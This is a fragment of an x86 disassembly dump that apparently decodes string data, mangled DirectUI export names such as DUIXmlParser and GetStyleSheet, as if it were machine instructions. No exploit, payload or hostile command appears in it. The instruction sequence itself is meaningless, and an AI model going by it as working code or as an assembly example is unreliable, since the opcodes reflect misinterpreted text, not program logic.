  4076ed:	fs outs dx,BYTE PTR gs:[esi]
  4076f0:	je     0x407732
  4076f2:	inc    ebp
  4076f3:	ins    BYTE PTR es:[edi],dx
  4076f4:	gs ins DWORD PTR es:[edi],dx
  4076f6:	outs   dx,BYTE PTR gs:[esi]
  4076f8:	je     0x40773a
  4076fa:	inc    esp
  4076fb:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  407702:	inc    eax
  407703:	inc    eax
  407704:	push   ecx
  407705:	inc    ecx
  407706:	inc    ebp
  407707:	push   eax
  407708:	inc    ecx
  407709:	push   esi
  40770a:	xor    DWORD PTR [edx],esi
  40770c:	inc    eax
  40770d:	inc    edi
  40770e:	inc    eax
  40770f:	pop    edx
  407710:	add    BYTE PTR [eax],al
  407712:	add    BYTE PTR [eax],al
  407714:	push   ebx
  407715:	je     0x407789
  407717:	push   esp
  407718:	outs   dx,DWORD PTR ds:[esi]
  407719:	dec    ecx
  40771a:	inc    esp
  40771b:	add    BYTE PTR [eax],al
  40771d:	add    BYTE PTR [edi],bh
  40771f:	inc    ebx
  407720:	jb     0x407787
  407722:	popa   
  407723:	je     0x40778a
  407725:	inc    ebp
  407726:	ins    BYTE PTR es:[edi],dx
  407727:	gs ins DWORD PTR es:[edi],dx
  407729:	outs   dx,BYTE PTR gs:[esi]
  40772b:	je     0x40776d
  40772d:	inc    esp
  40772e:	push   ebp
  40772f:	dec    ecx
  407730:	pop    eax
  407731:	ins    DWORD PTR es:[edi],dx
  407732:	ins    BYTE PTR es:[edi],dx
  407733:	push   eax
  407734:	popa   
  407735:	jb     0x4077aa
  407737:	gs jb  0x40777a
  40773a:	inc    esp
  40773b:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  407742:	inc    eax
  407743:	inc    eax
  407744:	push   ecx
  407745:	inc    ecx
  407746:	inc    ebp
  407747:	dec    edx
  407748:	push   eax
  407749:	inc    edx
  40774a:	inc    edi
  40774b:	push   eax
  40774c:	inc    ecx
  40774d:	push   esi
  40774e:	inc    ebp
  40774f:	ins    BYTE PTR es:[edi],dx
  407750:	gs ins DWORD PTR es:[edi],dx
  407752:	outs   dx,BYTE PTR gs:[esi]
  407754:	je     0x407796
  407756:	xor    al,BYTE PTR [eax+0x31]
  407759:	push   eax
  40775a:	inc    ecx
  40775b:	dec    ebx
  40775c:	push   eax
  40775d:	inc    ecx
  40775e:	push   eax
  40775f:	inc    ecx
  407760:	push   esi
  407761:	xor    esi,DWORD PTR [edx]
  407763:	inc    eax
  407764:	inc    eax
  407765:	pop    edx
  407766:	add    BYTE PTR [eax],al
  407768:	add    BYTE PTR [eax],al
  40776a:	dec    ecx
  40776b:	outs   dx,BYTE PTR ds:[esi]
  40776c:	imul   esi,DWORD PTR [esp+edx*2+0x68],0x64616572
  407774:	add    BYTE PTR [eax],al
  407776:	add    BYTE PTR [eax],al
  407778:	push   ebp
  407779:	outs   dx,BYTE PTR ds:[esi]
  40777a:	dec    ecx
  40777b:	outs   dx,BYTE PTR ds:[esi]
  40777c:	imul   esi,DWORD PTR [esp+edx*2+0x68],0x64616572
  407784:	add    BYTE PTR [eax],al
  407786:	add    BYTE PTR [eax],al
  407788:	aas    
  407789:	inc    edi
  40778a:	gs je  0x4077e0
  40778d:	push   0x40746565
  407792:	inc    esp
  407793:	push   ebp
  407794:	dec    ecx
  407795:	pop    eax
  407796:	ins    DWORD PTR es:[edi],dx
  407797:	ins    BYTE PTR es:[edi],dx
  407798:	push   eax
  407799:	popa   
  40779a:	jb     0x40780f
  40779c:	gs jb  0x4077df
  40779f:	inc    esp
  4077a0:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  4077a7:	inc    eax
  4077a8:	inc    eax
  4077a9:	push   ecx
  4077aa:	inc    ecx
  4077ab:	inc    ebp
  4077ac:	dec    edx
  4077ad:	push   eax
  4077ae:	inc    edx
  4077af:	inc    edi
  4077b0:	push   eax
  4077b1:	inc    ecx
  4077b2:	push   eax
  4077b3:	inc    ecx
  4077b4:	push   esi
  4077b5:	push   esi
  4077b6:	popa   
  4077b7:	ins    BYTE PTR es:[edi],dx
  4077b8:	jne    0x40781f
  4077ba:	inc    eax
  4077bb:	xor    al,BYTE PTR [eax+0x40]
  4077be:	pop    edx
  4077bf:	add    BYTE PTR [eax],al
  4077c1:	add    BYTE PTR [edi],bh
  4077c3:	inc    ebx
  4077c4:	jb     0x40782b
  4077c6:	popa   
  4077c7:	je     0x40782e
  4077c9:	inc    eax
  4077ca:	inc    esp
  4077cb:	push   ebp
  4077cc:	dec    ecx
  4077cd:	pop    eax
  4077ce:	ins    DWORD PTR es:[edi],dx
  4077cf:	ins    BYTE PTR es:[edi],dx
  4077d0:	push   eax
  4077d1:	popa   
  4077d2:	jb     0x407847
  4077d4:	gs jb  0x407817
  4077d7:	inc    esp
  4077d8:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  4077df:	inc    eax
  4077e0:	inc    eax
  4077e1:	push   ebx
  4077e2:	inc    edi
  4077e3:	dec    edx
  4077e4:	push   eax
  4077e5:	inc    ecx
  4077e6:	push   eax
  4077e7:	inc    ecx
  4077e8:	push   esi
  4077e9:	xor    DWORD PTR [edx],esi
  4077eb:	inc    eax
  4077ec:	push   eax
  4077ed:	ss inc edi
  4077ef:	push   eax
  4077f0:	inc    ecx
  4077f1:	push   esi
  4077f2:	push   esi
  4077f3:	popa   
  4077f4:	ins    BYTE PTR es:[edi],dx
  4077f5:	jne    0x40785c
  4077f7:	inc    eax
  4077f8:	xor    al,BYTE PTR [eax+0x50]
  4077fb:	inc    edx
  4077fc:	inc    edi
  4077fd:	push   eax
  4077fe:	inc    ecx
  4077ff:	pop    eax
  407800:	inc    eax
  407801:	pop    edx
  407802:	xor    dl,BYTE PTR [eax+0x36]
  407805:	inc    edi
  407806:	pop    eax
  407807:	xor    DWORD PTR [ecx],esi
  407809:	dec    eax
  40780a:	xor    al,BYTE PTR [eax+0x5a]
  40780d:	xor    al,BYTE PTR [eax+0x5a]
  407810:	add    BYTE PTR [eax],al
  407812:	add    BYTE PTR [eax],al
  407814:	aas    
  407815:	inc    esp
  407816:	gs jae 0x40788d
  407819:	jb     0x40788a
  40781b:	jns    0x40785d
  40781d:	inc    esp
  40781e:	push   ebp
  40781f:	dec    ecx
  407820:	pop    eax
  407821:	ins    DWORD PTR es:[edi],dx
  407822:	ins    BYTE PTR es:[edi],dx
  407823:	push   eax
  407824:	popa   
  407825:	jb     0x40789a
  407827:	gs jb  0x40786a
  40782a:	inc    esp
  40782b:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  407832:	inc    eax
  407833:	inc    eax
  407834:	push   ecx
  407835:	inc    ecx
  407836:	inc    ebp
  407837:	pop    eax
  407838:	pop    eax
  407839:	pop    edx
  40783a:	add    BYTE PTR [eax],al
  40783c:	add    BYTE PTR [eax],al
  40783e:	aas    
  40783f:	push   ebx
  407840:	gs je  0x40789b
  407843:	dec    ebp
  407844:	dec    esp
  407845:	inc    esi
  407846:	jb     0x4078b7
  407848:	ins    DWORD PTR es:[edi],dx
  407849:	push   edx
  40784a:	gs jae 0x4078bc
  40784d:	jne    0x4078c1
  40784f:	arpl   WORD PTR [ebp+0x40],sp
  407852:	inc    esp
  407853:	push   ebp
  407854:	dec    ecx
  407855:	pop    eax
  407856:	ins    DWORD PTR es:[edi],dx
  407857:	ins    BYTE PTR es:[edi],dx
  407858:	push   eax
  407859:	popa   
  40785a:	jb     0x4078cf
  40785c:	gs jb  0x40789f
  40785f:	inc    esp
  407860:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  407867:	inc    eax
  407868:	inc    eax
  407869:	push   ecx
  40786a:	inc    ecx
  40786b:	inc    ebp
  40786c:	dec    edx
  40786d:	push   eax
  40786e:	inc    edx
  40786f:	inc    edi
  407870:	push   eax
  407871:	inc    ecx
  407872:	push   ebp
  407873:	dec    eax
  407874:	dec    ecx
  407875:	dec    esi
  407876:	push   ebx
  407877:	push   esp
  407878:	inc    ecx
  407879:	dec    esi
  40787a:	inc    ebx
  40787b:	inc    ebp
  40787c:	pop    edi
  40787d:	pop    edi
  40787e:	inc    eax
  40787f:	inc    eax
  407880:	xor    DWORD PTR [eax+0x5a],eax
  407883:	add    BYTE PTR [eax],al
  407885:	add    BYTE PTR [edi],bh
  407887:	push   ebx
  407888:	gs je  0x4078e3
  40788b:	dec    ebp
  40788c:	dec    esp
  40788d:	inc    esi
  40788e:	jb     0x4078ff
  407890:	ins    DWORD PTR es:[edi],dx
  407891:	push   edx
  407892:	gs jae 0x407904
  407895:	jne    0x407909
  407897:	arpl   WORD PTR [ebp+0x57],sp
  40789a:	imul   esi,DWORD PTR [eax+ebp*2+0x54],0x656d6568
  4078a2:	inc    eax
  4078a3:	inc    esp
  4078a4:	push   ebp
  4078a5:	dec    ecx
  4078a6:	pop    eax
  4078a7:	ins    DWORD PTR es:[edi],dx
  4078a8:	ins    BYTE PTR es:[edi],dx
  4078a9:	push   eax
  4078aa:	popa   
  4078ab:	jb     0x407920
  4078ad:	gs jb  0x4078f0
  4078b0:	inc    esp
  4078b1:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  4078b8:	inc    eax
  4078b9:	inc    eax
  4078ba:	push   ecx
  4078bb:	inc    ecx
  4078bc:	inc    ebp
  4078bd:	dec    edx
  4078be:	dec    ecx
  4078bf:	push   eax
  4078c0:	inc    ecx
  4078c1:	push   ebp
  4078c2:	dec    eax
  4078c3:	dec    ecx
  4078c4:	dec    esi
  4078c5:	push   ebx
  4078c6:	push   esp
  4078c7:	inc    ecx
  4078c8:	dec    esi
  4078c9:	inc    ebx
  4078ca:	inc    ebp
  4078cb:	pop    edi
  4078cc:	pop    edi
  4078cd:	inc    eax
  4078ce:	inc    eax
  4078cf:	xor    BYTE PTR [eax],dh
  4078d1:	inc    eax
  4078d2:	pop    edx
  4078d3:	add    BYTE PTR [eax],al
  4078d5:	add    BYTE PTR [edi],bh
  4078d7:	push   edx
  4078d8:	gs ins BYTE PTR es:[edi],dx
  4078da:	gs popa 
  4078dc:	jae    0x407943
  4078de:	inc    eax
  4078df:	push   esi
  4078e0:	popa   
  4078e1:	ins    BYTE PTR es:[edi],dx
  4078e2:	jne    0x407949
  4078e4:	inc    eax
  4078e5:	inc    esp
  4078e6:	imul   esi,DWORD PTR [edx+0x65],0x49557463
  4078ed:	inc    eax
  4078ee:	inc    eax
  4078ef:	push   ecx
  4078f0:	inc    ecx
  4078f1:	inc    ebp
  4078f2:	pop    eax
  4078f3:	pop    eax
  4078f4:	pop    edx
	...
